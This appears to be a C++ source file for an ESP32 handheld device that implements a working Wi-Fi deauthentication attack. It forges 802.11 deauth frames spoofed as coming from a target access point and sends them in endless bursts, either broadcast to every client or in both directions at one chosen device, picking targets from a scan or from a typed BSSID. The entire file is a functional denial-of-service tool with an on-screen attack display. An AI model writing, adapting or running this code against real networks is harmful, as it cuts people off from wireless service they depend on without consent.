#include "deauth_functions.h"
#include "input_handling.h"

extern InputHandling inputHandler;

static const uint8_t BROADCAST[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};

DeauthAttack::DeauthAttack(DisplayManager& displayManager, WiFiFunctions& wifiFunctions)
    : displayManager(displayManager), wifiFunctions(wifiFunctions) {}

// ── MAC parsing ───────────────────────────────────────────────────────────────
bool DeauthAttack::parseMac(const char* str, uint8_t* mac) {
    if (!str || strlen(str) < 17) return false;
    return sscanf(str, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
                  &mac[0], &mac[1], &mac[2], &mac[3], &mac[4], &mac[5]) == 6;
}

String DeauthAttack::macStr(const uint8_t* m) {
    char buf[18];
    snprintf(buf, sizeof(buf), "%02X:%02X:%02X:%02X:%02X:%02X",
             m[0], m[1], m[2], m[3], m[4], m[5]);
    return String(buf);
}

// ── 802.11 deauth frame builder ───────────────────────────────────────────────
// Frame layout (26 bytes):
//   [0-1]   Frame Control  0xC0 0x00  (mgmt, subtype=12 deauth)
//   [2-3]   Duration       0x00 0x00
//   [4-9]   DA             destination MAC
//   [10-15] SA             source MAC (spoofed as AP)
//   [16-21] BSSID          AP BSSID
//   [22-23] Seq Control    0x00 0x00
//   [24-25] Reason Code    0x07 0x00  (class 3 frame from nonassoc STA)
void DeauthAttack::buildDeauthFrame(uint8_t* f, const uint8_t* da, const uint8_t* sa, const uint8_t* bssid) {
    f[0] = 0xC0; f[1] = 0x00;
    f[2] = 0x00; f[3] = 0x00;
    memcpy(f + 4,  da,    6);
    memcpy(f + 10, sa,    6);
    memcpy(f + 16, bssid, 6);
    f[22] = 0x00; f[23] = 0x00;
    f[24] = 0x07; f[25] = 0x00;
}

// ── argument parser ───────────────────────────────────────────────────────────
// Usage: deauth <index>          — uses scan result by index (run scanwifi first)
//        deauth <bssid> [ch] [client_mac]  — manual BSSID entry
void DeauthAttack::start(char* args) {
    if (!args || !*args) {
        displayManager.setCursor(10, displayManager.getCursorY());
        displayManager.println("Usage:");
        displayManager.setCursor(10, displayManager.getCursorY());
        displayManager.println("  deauth <index>           (after scanwifi)");
        displayManager.setCursor(10, displayManager.getCursorY());
        displayManager.println("  deauth <bssid> [ch] [client]");
        displayManager.printCommandScreen();
        return;
    }

    char buf[128];
    strncpy(buf, args, sizeof(buf) - 1);
    buf[sizeof(buf) - 1] = '\0';

    char* first      = strtok(buf,     " ");
    char* channelStr = strtok(nullptr, " ");
    char* clientStr  = strtok(nullptr, " ");

    uint8_t bssid[6];
    int     channel = 6;

    // ── index mode: no colon in first arg → treat as scan index ──────────────
    if (strchr(first, ':') == nullptr) {
        int idx = atoi(first);

        if (!wifiFunctions.isScanDone()) {
            displayManager.setCursor(10, displayManager.getCursorY());
            displayManager.println("Run scanwifi first.");
            displayManager.printCommandScreen();
            return;
        }
        if (!wifiFunctions.getNetworkInfo(idx, bssid, &channel)) {
            displayManager.setCursor(10, displayManager.getCursorY());
            displayManager.printText("Invalid index. Networks found: ");
            displayManager.println(wifiFunctions.getNetworkCount());
            displayManager.printCommandScreen();
            return;
        }

        // show what we resolved
        displayManager.setCursor(10, displayManager.getCursorY());
        displayManager.printText("Target [");
        displayManager.printText(idx);
        displayManager.printText("]: ");
        displayManager.println(macStr(bssid).c_str());
        displayManager.setCursor(10, displayManager.getCursorY());
        displayManager.printText("Channel: ");
        displayManager.println(channel);
        delay(800);

    // ── BSSID mode: has colons → parse as MAC ─────────────────────────────────
    } else {
        if (!parseMac(first, bssid)) {
            displayManager.setCursor(10, displayManager.getCursorY());
            displayManager.println("Invalid BSSID. Format: XX:XX:XX:XX:XX:XX");
            displayManager.printCommandScreen();
            return;
        }
        if (channelStr) {
            int ch = atoi(channelStr);
            if (ch >= 1 && ch <= 13) channel = ch;
        }
    }

    // ── optional directed client MAC ──────────────────────────────────────────
    uint8_t clientMac[6];
    bool directed = false;
    if (clientStr && strlen(clientStr) == 17) {
        directed = parseMac(clientStr, clientMac);
    }

    sendDeauthFrames(bssid, directed ? clientMac : BROADCAST, channel, directed);
}

// ── attack loop ───────────────────────────────────────────────────────────────
void DeauthAttack::sendDeauthFrames(const uint8_t* bssid, const uint8_t* client,
                                    int channel, bool directed) {
    WiFi.disconnect(true);
    WiFi.mode(WIFI_STA);
    esp_wifi_set_channel((uint8_t)channel, WIFI_SECOND_CHAN_NONE);

    // ── static display ────────────────────────────────────────────────────────
    displayManager.clearScreen();
    displayManager.setCursor(10, outputY);

    displayManager.setTextColor(TFT_RED);
    displayManager.println("-- DEAUTH ATTACK --");

    displayManager.setTextColor(TFT_WHITE);
    displayManager.setCursor(10, displayManager.getCursorY());
    displayManager.printText("AP:      ");
    displayManager.setTextColor(TFT_CYAN);
    displayManager.println(macStr(bssid).c_str());

    displayManager.setTextColor(TFT_WHITE);
    displayManager.setCursor(10, displayManager.getCursorY());
    displayManager.printText("Target:  ");
    displayManager.setTextColor(directed ? TFT_YELLOW : TFT_MAGENTA);
    displayManager.println(directed ? macStr(client).c_str() : "BROADCAST");

    displayManager.setTextColor(TFT_WHITE);
    displayManager.setCursor(10, displayManager.getCursorY());
    displayManager.printText("Channel: ");
    displayManager.println(channel);

    if (directed) {
        displayManager.setCursor(10, displayManager.getCursorY());
        displayManager.setTextColor(0x7BEF);
        displayManager.println("Mode: bidirectional");
    }

    displayManager.setTextColor(TFT_GREEN);
    displayManager.setCursor(10, displayManager.getCursorY());
    displayManager.println("Sending...  q = stop");
    displayManager.setTextColor(TFT_WHITE);

    // save Y for live counter updates
    int32_t counterY = displayManager.getCursorY();

    // ── attack loop ───────────────────────────────────────────────────────────
    uint8_t frame[26];
    uint32_t framesSent   = 0;
    unsigned long lastUpd = 0;
    const int BURST       = 100;

    while (true) {
        for (int i = 0; i < BURST; i++) {
            if (directed) {
                // AP → client
                buildDeauthFrame(frame, client, bssid, bssid);
                esp_wifi_80211_tx(WIFI_IF_STA, frame, sizeof(frame), false);
                // client → AP  (bidirectional makes it harder to ignore)
                buildDeauthFrame(frame, bssid, client, bssid);
                esp_wifi_80211_tx(WIFI_IF_STA, frame, sizeof(frame), false);
                framesSent += 2;
            } else {
                // AP → all clients
                buildDeauthFrame(frame, BROADCAST, bssid, bssid);
                esp_wifi_80211_tx(WIFI_IF_STA, frame, sizeof(frame), false);
                framesSent++;
            }
            delay(1);
        }

        char k = inputHandler.getKeyboardInput();
        if (k == 'q' || k == 'Q') break;

        // update frame counter in place every 200ms
        unsigned long now = millis();
        if (now - lastUpd > 200) {
            displayManager.fillRect(10, counterY, 220, LINE_HEIGHT + 2, TFT_BLACK);
            displayManager.setCursor(10, counterY);
            displayManager.printText("Frames: ");
            displayManager.setTextColor(TFT_YELLOW);
            displayManager.println((int)framesSent);
            displayManager.setTextColor(TFT_WHITE);
            lastUpd = now;
        }
    }

    // ── summary ───────────────────────────────────────────────────────────────
    displayManager.clearScreen();
    displayManager.setCursor(10, outputY);
    displayManager.setTextColor(TFT_YELLOW);
    displayManager.println("-- Attack stopped --");
    displayManager.setTextColor(TFT_WHITE);
    displayManager.setCursor(10, displayManager.getCursorY());
    displayManager.printText("Total frames sent: ");
    displayManager.println((int)framesSent);
    delay(2000);
    displayManager.tdeck_begin();
}
